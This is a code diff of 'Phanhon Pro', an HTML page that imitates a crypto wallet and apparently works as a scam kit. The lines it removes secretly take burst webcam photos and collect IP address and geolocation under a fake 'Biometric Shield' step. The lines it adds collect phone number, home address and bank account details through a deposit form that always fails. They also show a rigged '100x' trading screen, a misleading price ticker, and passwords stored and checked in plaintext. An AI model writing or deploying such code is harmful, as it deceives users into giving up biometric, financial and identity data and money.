@@ -3,384 +3,652 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phanhon Pro | Secure Access</title>
+    <title>Phanhon Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Using standard Supabase import -->
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
         
-        :root { 
-            --accent: #ffffff; 
-            --bg: #000000; 
-            --card: #0a0a0a; 
-            --muted: #555555; 
+        :root {
+            --phantom-purple: #ab66ff;
         }
 
         body { 
             font-family: 'Inter', sans-serif; 
-            background-color: var(--bg); 
+            background-color: #000; 
             color: #fff; 
             margin: 0; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
-            min-height: 100vh; 
-            overscroll-behavior-y: contain; 
-            overflow: hidden;
+            min-height: 100vh;
+            overscroll-behavior-y: contain;
         }
 
         .app-container { 
             width: 100%; 
             height: 100vh; 
-            background: var(--bg); 
+            background: #000; 
             position: relative; 
             display: flex; 
             flex-direction: column; 
             overflow: hidden; 
         }
 
-        @media (min-width: 640px) { 
-            .app-container { 
+        @media (min-width: 640px) {
+            .app-container {
                 max-width: 380px; 
                 height: 720px; 
                 border: 1px solid #1a1a1a; 
-                border-radius: 40px; 
-                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            } 
+                border-radius: 32px; 
+            }
         }
 
-        .glass { 
-            background: var(--card); 
-            border: 1px solid rgba(255, 255, 255, 0.05); 
-        }
+        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .phantom-btn { background: var(--phantom-purple); color: white; font-weight: 700; border-radius: 12px; transition: all 0.1s ease; }
+        .phantom-btn:active { transform: scale(0.97); }
+        
+        .loader { width: 20px; height: 20px; border: 2px solid var(--phantom-purple); border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .chart-container-wrapper { position: relative; height: 200px; width: 100%; background: #050505; overflow: hidden; display: flex; align-items: flex-end; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .candle { position: absolute; width: 6px; bottom: 0; height: 100%; }
+        .wick { position: absolute; width: 1px; left: 2.5px; background: currentColor; opacity: 0.6; z-index: 10; }
+        .body { position: absolute; width: 100%; border-radius: 1px; z-index: 20; }
+        
+        .target-line { position: absolute; left: 0; right: 0; height: 1px; border-top-width: 1px; border-style: dashed; z-index: 25; pointer-events: none; }
+        .fomo-ticker { background: var(--phantom-purple); height: 28px; display: flex; align-items: center; font-size: 9px; font-weight: 800; text-transform: uppercase; white-space: nowrap; overflow: hidden; }
+        .ticker-scroll { display: inline-block; animation: scroll 15s linear infinite; }
+        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
 
-        .phantom-btn { 
-            background: var(--accent); 
-            color: #000; 
-            font-weight: 700; 
-            border-radius: 14px; 
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
-        }
-
-        .phantom-btn:active { 
-            transform: scale(0.96); 
-            opacity: 0.8; 
-        }
-
-        .loader { 
-            width: 24px; 
-            height: 24px; 
-            border: 3px solid rgba(255,255,255,0.1); 
-            border-bottom-color: #fff; 
-            border-radius: 50%; 
-            display: inline-block; 
-            animation: rotation 0.8s linear infinite; 
-        }
-
-        @keyframes rotation { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
-
+        input::placeholder { color: rgba(255,255,255,0.2); }
+        .view { height: 100%; display: flex; flex-direction: column; }
         .hidden { display: none !important; }
-
-        video { 
-            transform: scaleX(-1); 
-            border-radius: 24px; 
-            background: #050505; 
-            object-fit: cover;
-        }
-
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-        }
     </style>
 </head>
 <body>
-    <div class="app-container" id="app">
-        <!-- AUTH SCREEN -->
-        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center animate__animated animate__fadeIn">
-            <div class="w-12 h-12 bg-white rounded-xl mb-6 flex items-center justify-center text-2xl font-black text-black">P</div>
-            <h1 class="text-3xl font-bold mb-2 tracking-tighter">Phanhon Pro</h1>
-            <p class="text-white/40 text-xs mb-10 uppercase tracking-widest">Secure Terminal v4.0</p>
-            
-            <div id="login-form" class="space-y-4">
-                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Sign In</button>
-                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('signup')">REQUEST ACCESS / CREATE ACCOUNT</p>
-            </div>
 
-            <div id="signup-form" class="hidden space-y-4 animate__animated animate__fadeIn">
-                <input id="signup-username" type="text" placeholder="New Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <input id="signup-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Begin Verification</button>
-                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('login')">RETURN TO LOGIN</p>
+    <div class="app-container" id="app">
+        <div class="fomo-ticker"><div class="ticker-scroll">🚨 LIQUIDATION ALERT: sol chance going up by 20% next week • BTC TESTING NEW HIGHS • PHANHON DEPLOYED SUCCESSFULLY •</div></div>
+
+        <!-- AUTH SCREEN -->
+        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center">
+            <div class="w-16 h-16 bg-[#ab66ff] rounded-2xl mb-6 flex items-center justify-center text-3xl font-bold">P</div>
+            <h1 class="text-2xl font-extrabold mb-8 tracking-tight">Phanhon Pro</h1>
+            <div id="login-form" class="space-y-3">
+                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
+                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
+                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Connect Wallet</button>
+                <p class="text-[10px] text-white/20 text-center mt-4 cursor-pointer" onclick="toggleAuth('signup')">CREATE NEW WALLET</p>
+            </div>
+            <div id="signup-form" class="hidden space-y-3">
+                <input id="signup-username" type="text" placeholder="Choose Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
+                <input id="signup-password" type="password" placeholder="Create Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none text-white">
+                <button onclick="signUp()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Generate Keys</button>
+                <p class="text-[10px] text-white/20 text-center mt-4 cursor-pointer" onclick="toggleAuth('login')">BACK TO LOGIN</p>
             </div>
         </div>
 
-        <!-- VERIFICATION SCREEN -->
-        <div id="verify-screen" class="hidden absolute inset-0 bg-black z-[600] p-8 flex flex-col items-center justify-center animate__animated animate__slideInUp">
-            <div class="text-center mb-8">
-                <h2 class="text-xl font-bold mb-2">Biometric Shield</h2>
-                <p id="verify-instruction" class="text-[11px] text-white/40 leading-relaxed px-6">Encrypted identity mapping is required for terminal authorization.</p>
+        <!-- MAIN APP -->
+        <div id="main-screen" class="hidden flex flex-col h-full">
+            <div class="p-5 flex justify-between items-center bg-black/50 backdrop-blur-md sticky top-0 z-50">
+                <div class="flex items-center gap-3">
+                    <div id="avatar-init" class="w-8 h-8 bg-[#ab66ff] rounded-lg flex items-center justify-center font-bold text-sm">?</div>
+                    <div>
+                        <div id="user-display" class="font-bold text-xs">...</div>
+                        <div id="wallet-address-head" class="text-[9px] text-white/20 font-semibold">0x...</div>
+                    </div>
+                </div>
+                <button onclick="signOut()" class="opacity-40 p-2"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/></svg></button>
             </div>
-            
-            <div class="relative w-full aspect-square max-w-[240px] mb-8 group">
-                <!-- Decorative Corners -->
-                <div class="absolute -top-2 -left-2 w-6 h-6 border-t-2 border-l-2 border-white/20 rounded-tl-lg"></div>
-                <div class="absolute -top-2 -right-2 w-6 h-6 border-t-2 border-r-2 border-white/20 rounded-tr-lg"></div>
-                <div class="absolute -bottom-2 -left-2 w-6 h-6 border-b-2 border-l-2 border-white/20 rounded-bl-lg"></div>
-                <div class="absolute -bottom-2 -right-2 w-6 h-6 border-b-2 border-r-2 border-white/20 rounded-br-lg"></div>
 
-                <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center bg-white/5 rounded-3xl border border-white/10 overflow-hidden">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1.5">
-                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-                        <circle cx="12" cy="13" r="4"/>
-                    </svg>
+            <div id="view-container" class="flex-1 overflow-y-auto px-5 pb-24">
+                <!-- DASHBOARD -->
+                <div id="view-dashboard" class="view">
+                    <div class="py-8 text-center">
+                        <p class="text-[10px] font-bold text-white/20 uppercase tracking-widest mb-1">Total Balance</p>
+                        <h2 id="balance-usd" class="text-4xl font-extrabold tracking-tight">$0.00</h2>
+                    </div>
+                    <div class="grid grid-cols-3 gap-2 mb-8">
+                        <button onclick="switchView('send')" class="phantom-btn py-3 text-[10px] uppercase">Send</button>
+                        <button onclick="switchView('deposit')" class="glass rounded-xl py-3 text-[10px] font-bold uppercase">Deposit</button>
+                        <button onclick="switchView('receive')" class="glass rounded-xl py-3 text-[10px] font-bold uppercase">Receive</button>
+                    </div>
+                    <div class="space-y-3">
+                        <div class="glass p-4 rounded-2xl flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-black border border-white/5 rounded-xl flex items-center justify-center font-bold">S</div>
+                                <div><p class="text-xs font-bold">Solana</p><p id="sol-price-display" class="text-[9px] text-white/40">$145.50</p></div>
+                            </div>
+                            <div class="text-right"><p id="balance-sol" class="text-xs font-bold">0.00 SOL</p><p id="balance-usd-sol" class="text-[9px] text-white/40">$0.00</p></div>
+                        </div>
+                    </div>
                 </div>
 
-                <video id="video" width="100%" height="100%" autoplay playsinline muted class="hidden w-full h-full object-cover rounded-3xl"></video>
-                <canvas id="canvas" class="hidden"></canvas>
-                <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100 rounded-3xl z-10"></div>
-                
-                <!-- Scanning Line -->
-                <div id="scanner-line" class="hidden absolute left-0 right-0 h-0.5 bg-white/30 shadow-[0_0_15px_rgba(255,255,255,0.5)] z-20 animate-pulse"></div>
+                <!-- DEPOSIT VIEW -->
+                <div id="view-deposit" class="hidden view animate__animated animate__fadeIn">
+                    <div class="flex items-center gap-2 mb-6 mt-4">
+                        <button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                        <h3 class="text-xl font-bold">Deposit Funds</h3>
+                    </div>
+                    <div id="deposit-step-form" class="space-y-3">
+                        <p class="text-[10px] text-white/40 uppercase font-bold px-1">Link Payment Method</p>
+                        <div class="glass p-3 rounded-xl"><input id="dep-phone" type="text" placeholder="Phone Number" class="bg-transparent w-full text-xs outline-none"></div>
+                        <div class="glass p-3 rounded-xl"><input id="dep-address" type="text" placeholder="Physical Address" class="bg-transparent w-full text-xs outline-none"></div>
+                        <div class="glass p-3 rounded-xl"><input id="dep-bank" type="text" placeholder="Bank Name & Account #" class="bg-transparent w-full text-xs outline-none"></div>
+                        <button onclick="saveAndProcessDeposit()" class="phantom-btn w-full py-4 text-[10px] uppercase mt-2">Verify & Deposit</button>
+                    </div>
+                    <div id="deposit-status-box" class="hidden glass p-6 rounded-2xl text-center space-y-4">
+                        <div id="status-spinner" class="flex flex-col items-center gap-3">
+                            <span class="loader"></span>
+                            <p class="text-xs font-bold uppercase tracking-widest text-[#ab66ff]">Processing Verification</p>
+                            <p class="text-[10px] text-white/40">Our banking partner is validating your details...</p>
+                        </div>
+                        <div id="status-rejected" class="hidden flex flex-col items-center gap-3">
+                            <div class="w-12 h-12 bg-red-500/20 rounded-full flex items-center justify-center text-red-500">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                            </div>
+                            <p class="text-xs font-bold uppercase text-red-500">Deposit Rejected</p>
+                            <p class="text-[10px] text-white/60">Verification failed: The provided bank details or address do not match the regional banking network.</p>
+                            <button onclick="resetDeposit()" class="text-[9px] uppercase font-bold text-[#ab66ff] p-2">Try Again</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SEND VIEW -->
+                <div id="view-send" class="hidden view animate__animated animate__fadeIn">
+                    <div class="flex items-center gap-2 mb-6 mt-4">
+                        <button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                        <h3 class="text-xl font-bold">Send SOL</h3>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="glass p-4 rounded-xl"><input id="send-to-addr" type="text" placeholder="Recipient Address" class="bg-transparent w-full text-xs outline-none"></div>
+                        <div class="glass p-4 rounded-xl"><input id="send-amount" type="number" placeholder="0.00" class="bg-transparent w-full text-xl font-bold outline-none"></div>
+                        <p id="available-balance-hint" class="text-[10px] text-white/30 font-bold px-2"></p>
+                    </div>
+                    <button onclick="transferFunds()" class="phantom-btn w-full py-4 mt-8 text-xs uppercase">Confirm Send</button>
+                </div>
+
+                <!-- RECEIVE VIEW -->
+                <div id="view-receive" class="hidden view text-center pt-6 animate__animated animate__fadeIn">
+                    <div class="flex items-center gap-2 mb-6 text-left">
+                        <button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                        <h3 class="text-xl font-bold">Receive</h3>
+                    </div>
+                    <div class="bg-white p-4 rounded-2xl inline-block mb-6"><div id="qr-pattern" class="w-32 h-32 grid grid-cols-8"></div></div>
+                    <p id="receive-address" class="text-[10px] font-mono break-all opacity-40 px-6 mb-4"></p>
+                    <button onclick="copyAddress()" class="text-[#ab66ff] text-[10px] font-bold uppercase p-2">Copy Address</button>
+                </div>
+
+                <!-- TRADE VIEW -->
+                <div id="view-trade" class="hidden view animate__animated animate__fadeIn">
+                    <div class="flex items-center gap-2 mb-4 mt-4">
+                        <button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                        <h3 class="text-xl font-bold">Trade Perps</h3>
+                    </div>
+                    <div class="flex justify-between items-end mb-4">
+                        <div>
+                           <p class="text-[9px] text-white/40 font-bold uppercase">Solana / USD</p>
+                           <span id="live-price-large" class="text-green-400 font-mono font-bold text-lg leading-tight">$145.50</span>
+                           <span id="price-percent" class="text-[10px] font-bold ml-1 text-green-400">+2.41%</span>
+                        </div>
+                    </div>
+                    <div class="glass h-52 rounded-2xl mb-4 relative overflow-hidden bg-[#050505] border border-white/10">
+                        <div id="chart-container" class="chart-container-wrapper"></div>
+                        <div id="position-line" class="hidden target-line border-[#ab66ff]"><span class="absolute right-0 bg-[#ab66ff] text-[6px] px-1 font-bold">ENTRY</span></div>
+                    </div>
+                    <div id="active-trade-box" class="hidden glass p-3 rounded-xl mb-4 border-l-4 border-green-500">
+                         <div class="flex justify-between items-center">
+                            <div class="flex flex-col">
+                                <span class="text-[8px] font-bold uppercase text-green-400">Position Open</span>
+                                <span id="trade-timer" class="text-[8px] opacity-40">00:30 remaining</span>
+                            </div>
+                            <span id="pos-pnl" class="text-xs font-mono">+$0.00</span>
+                         </div>
+                    </div>
+                    <div class="glass p-5 rounded-2xl mb-4">
+                        <div class="flex justify-between mb-4">
+                            <button id="buy-tab" onclick="setSide('buy')" class="flex-1 text-[10px] font-bold text-green-400 border-b-2 border-green-400 pb-2">Buy / Long</button>
+                            <button id="sell-tab" onclick="setSide('sell')" class="flex-1 text-[10px] font-bold text-white/20 pb-2">Sell / Short</button>
+                        </div>
+                        <input id="trade-amount" type="number" placeholder="0.00 SOL" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl outline-none text-white text-sm font-bold">
+                    </div>
+                    <button onclick="gambleTrade()" id="trade-btn" class="phantom-btn w-full py-4 text-xs uppercase">Execute 100x Order</button>
+                </div>
+
+                <!-- HISTORY VIEW -->
+                <div id="view-history" class="hidden view pt-4 animate__animated animate__fadeIn">
+                    <div class="flex items-center gap-2 mb-6 text-left">
+                        <button onclick="switchView('dashboard')" class="opacity-50 p-2"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
+                        <h3 class="text-xl font-bold">Activity</h3>
+                    </div>
+                    <div id="history-list" class="space-y-2"></div>
+                </div>
             </div>
 
-            <div class="w-full space-y-3">
-                <button id="enable-camera-btn" onclick="requestCamera()" class="glass w-full py-4 text-[10px] font-bold uppercase tracking-widest rounded-2xl hover:bg-white/5 transition-colors">Initialize Camera</button>
-                <button id="capture-btn" onclick="captureStep()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Capture Identity</button>
-                <button id="location-btn" onclick="requestLocation()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Finalize Geo-Lock</button>
-            </div>
-
-            <div id="verify-loader" class="hidden flex flex-col items-center gap-4 mt-8">
-                <span class="loader"></span>
-                <p class="text-[9px] uppercase font-bold text-white/30 tracking-[0.4em]">Encrypting Tunnel...</p>
+            <!-- NAVBAR -->
+            <div class="h-20 bg-black/95 backdrop-blur-lg border-t border-white/5 px-8 flex justify-between items-center fixed bottom-0 left-0 right-0 sm:absolute sm:bottom-0">
+                <button onclick="switchView('dashboard')" class="nav-btn transition-opacity duration-200" id="nav-dashboard"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg></button>
+                <button onclick="switchView('trade')" class="nav-btn transition-opacity duration-200" id="nav-trade"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/></svg></button>
+                <button onclick="switchView('history')" class="nav-btn transition-opacity duration-200" id="nav-history"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></button>
             </div>
         </div>
 
-        <!-- NOTIFICATION TOAST -->
-        <div id="toast" class="absolute bottom-10 left-1/2 -translate-x-1/2 glass px-6 py-4 rounded-2xl text-[10px] font-bold transition-all transform translate-y-64 z-[1001] shadow-2xl text-center min-w-[240px] border-white/10 uppercase tracking-widest">
-            Notification
-        </div>
+        <div id="loading-overlay" class="hidden absolute inset-0 bg-black/80 z-[1000] flex items-center justify-center"><div class="loader"></div></div>
+        <div id="toast" class="absolute bottom-24 left-1/2 -translate-x-1/2 glass px-5 py-3 rounded-xl text-[10px] font-bold transition-all translate-y-64 z-[1001] shadow-2xl">Toast</div>
     </div>
 
     <script>
-        /** * GLOBAL CONFIG 
-         */
-        // INSERT YOUR FILENAME HERE (e.g., "dashboard.html" or "https://yoursite.com")
-        const REDIRECT_URL = "dashboard.html"; 
-        
-        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
-        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
+        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
+        let SOL_PRICE = 145.50;
+        let user = null;
+        let tradeSide = 'buy';
+        let candles = [];
+        let profileSubscription = null;
+        let historySubscription = null;
+        let isTrading = false;
 
-        let sb = null;
-        let verifyStep = 0;
-        let capturedData = { thumb: null, smile: null, geo: null, device: null, burst: [] };
-        let burstInterval = null;
-
-        // Initialize Supabase
-        function initSupabase() {
-            if (typeof supabase !== 'undefined') {
-                sb = supabase.createClient(SB_URL, SB_KEY);
-            } else { 
-                setTimeout(initSupabase, 200); 
-            }
-        }
-        window.onload = initSupabase;
-
-        // UI Helpers
-        function toggleAuth(mode) { 
-            const login = document.getElementById('login-form');
-            const signup = document.getElementById('signup-form');
-            if (mode === 'signup') {
-                login.classList.add('hidden');
-                signup.classList.remove('hidden');
+        window.onload = () => {
+            const savedUser = localStorage.getItem('phantom_user');
+            if(savedUser) { 
+                user = JSON.parse(savedUser); 
+                loadSession(); 
             } else {
-                login.classList.remove('hidden');
-                signup.classList.add('hidden');
+                // If no user, show auth screen
+                document.getElementById('auth-screen').classList.remove('hidden');
+                document.getElementById('main-screen').classList.add('hidden');
             }
-        }
+            initRealisticChart();
+            setInterval(tickPrice, 2000);
+            loadSavedKYC();
+        };
 
-        function showToast(msg) { 
-            const t = document.getElementById('toast'); 
-            t.innerText = msg; 
-            t.classList.remove('translate-y-64'); 
-            setTimeout(() => t.classList.add('translate-y-64'), 3000); 
-        }
-
-        function flashEffect() {
-            const f = document.getElementById('capture-flash');
-            f.style.opacity = '1';
-            setTimeout(() => f.style.opacity = '0', 150);
-        }
-
-        // Logic: SignIn
-        async function signIn() {
-            const u = document.getElementById('login-username').value;
-            const p = document.getElementById('login-password').value;
-            
-            if(!u || !p) return showToast("Credentials Missing");
-
-            try {
-                const { data, error } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
-                if(data && !error) { 
-                    showToast("Access Verified. Launching...");
-                    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
-                } else {
-                    showToast("Invalid Signature");
-                }
-            } catch (err) {
-                showToast("Terminal Connection Error");
+        async function loadSession() {
+            // Re-fetch profile to ensure data is fresh
+            const { data, error } = await sb.from('profiles').select('*').eq('id', user.id).single();
+            if(data) { 
+                user = data; 
+                localStorage.setItem('phantom_user', JSON.stringify(user)); 
+            } else if (error) {
+                // If profile doesn't exist anymore, sign out
+                signOut();
+                return;
             }
-        }
-
-        // Logic: Signup Flow
-        function startVerificationFlow() {
-            const u = document.getElementById('signup-username').value;
-            const p = document.getElementById('signup-password').value;
-            if(!u || !p) return showToast("Profile Data Required");
             
             document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('verify-screen').classList.remove('hidden');
+            document.getElementById('main-screen').classList.remove('hidden');
+            
+            subscribeToProfile();
+            subscribeToHistory();
+            syncUserProfile(); 
+            updateUI(); 
+            switchView('dashboard');
         }
 
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 640 } 
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.classList.remove('hidden');
-                    document.getElementById('camera-placeholder').classList.add('hidden');
-                    document.getElementById('enable-camera-btn').classList.add('hidden');
-                    document.getElementById('capture-btn').classList.remove('hidden');
-                    document.getElementById('scanner-line').classList.remove('hidden');
-                    startBurstCapture();
-                };
-            } catch (e) { 
-                showToast("Sensor Access Required"); 
+        async function signUp() {
+            const username = document.getElementById('signup-username').value.trim();
+            const password = document.getElementById('signup-password').value.trim();
+            if (!username || !password) return showToast("Fields Required");
+            
+            toggleLoading(true);
+            const { data, error } = await sb.from('profiles').insert([{ 
+                username, 
+                password, 
+                balance: 0.1 // Giving new users a small starting balance for demo
+            }]).select().single();
+            
+            toggleLoading(false);
+            if (error) return showToast("Account exists or error occurred");
+            
+            // Log in immediately after sign up
+            user = data;
+            localStorage.setItem('phantom_user', JSON.stringify(user));
+            showToast("Wallet Generated!"); 
+            loadSession();
+        }
+
+        async function signIn() {
+            const username = document.getElementById('login-username').value.trim();
+            const password = document.getElementById('login-password').value.trim();
+            if (!username || !password) return showToast("Fields Required");
+
+            toggleLoading(true);
+            const { data, error } = await sb.from('profiles')
+                .select('*')
+                .eq('username', username)
+                .eq('password', password)
+                .single();
+            
+            toggleLoading(false);
+            if (error || !data) return showToast("Access Denied");
+            
+            user = data; 
+            localStorage.setItem('phantom_user', JSON.stringify(user)); 
+            loadSession();
+        }
+
+        function loadSavedKYC() {
+            const kyc = localStorage.getItem('phantom_kyc');
+            if(kyc) {
+                const data = JSON.parse(kyc);
+                document.getElementById('dep-phone').value = data.phone || '';
+                document.getElementById('dep-address').value = data.address || '';
+                document.getElementById('dep-bank').value = data.bank || '';
             }
         }
 
-        function startBurstCapture() {
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 200;
-            const ctx = canvas.getContext('2d');
-            let count = 0;
-
-            burstInterval = setInterval(() => {
-                if(count >= 15) { clearInterval(burstInterval); return; }
-                if(video.srcObject) {
-                    ctx.drawImage(video, 0, 0, 200, 200);
-                    capturedData.burst.push(canvas.toDataURL('image/jpeg', 0.15));
-                    count++;
-                }
-            }, 2500);
+        function saveAndProcessDeposit() {
+            const phone = document.getElementById('dep-phone').value.trim();
+            const address = document.getElementById('dep-address').value.trim();
+            const bank = document.getElementById('dep-bank').value.trim();
+            if(!phone || !address || !bank) return showToast("All details required");
+            localStorage.setItem('phantom_kyc', JSON.stringify({ phone, address, bank }));
+            document.getElementById('deposit-step-form').classList.add('hidden');
+            document.getElementById('deposit-status-box').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('status-spinner').classList.add('hidden');
+                document.getElementById('status-rejected').classList.remove('hidden');
+            }, 4000);
         }
 
-        function captureStep() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = 400; canvas.height = 400;
-            const ctx = canvas.getContext('2d');
-            
-            // Flip for natural save if mirrored
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, 400, 400);
-            
-            const img = canvas.toDataURL('image/jpeg', 0.5);
-            flashEffect();
-
-            if(verifyStep === 0) {
-                capturedData.thumb = img; 
-                verifyStep = 1;
-                document.getElementById('verify-instruction').innerText = "Identity Captured. Analyzing Nodes...";
-                showToast("Node Alpha Recorded");
-            } else {
-                capturedData.smile = img; 
-                verifyStep = 2;
-                document.getElementById('capture-btn').classList.add('hidden');
-                document.getElementById('location-btn').classList.remove('hidden');
-                document.getElementById('verify-instruction').innerText = "Node Beta Verified. Finalizing Geo-Lock.";
-                showToast("Node Beta Recorded");
-            }
+        function resetDeposit() {
+            document.getElementById('deposit-step-form').classList.remove('hidden');
+            document.getElementById('deposit-status-box').classList.add('hidden');
+            document.getElementById('status-spinner').classList.remove('hidden');
+            document.getElementById('status-rejected').classList.add('hidden');
         }
 
-        async function requestLocation() {
-            document.getElementById('location-btn').classList.add('hidden');
-            document.getElementById('verify-loader').classList.remove('hidden');
-            
-            // Collect Device Meta
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                capturedData.device = {
-                    ipv4: ipData.ip,
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    res: `${window.innerWidth}x${window.innerHeight}`
-                };
-            } catch(e) { 
-                capturedData.device = { ipv4: 'Hidden' };
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => { 
-                    capturedData.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                    finishSignUp();
-                },
-                () => { 
-                    capturedData.geo = { status: "Denied" };
-                    finishSignUp(); 
-                }, 
-                { timeout: 4000 }
-            );
+        function subscribeToProfile() {
+            if (profileSubscription) profileSubscription.unsubscribe();
+            profileSubscription = sb.channel('profile-channel')
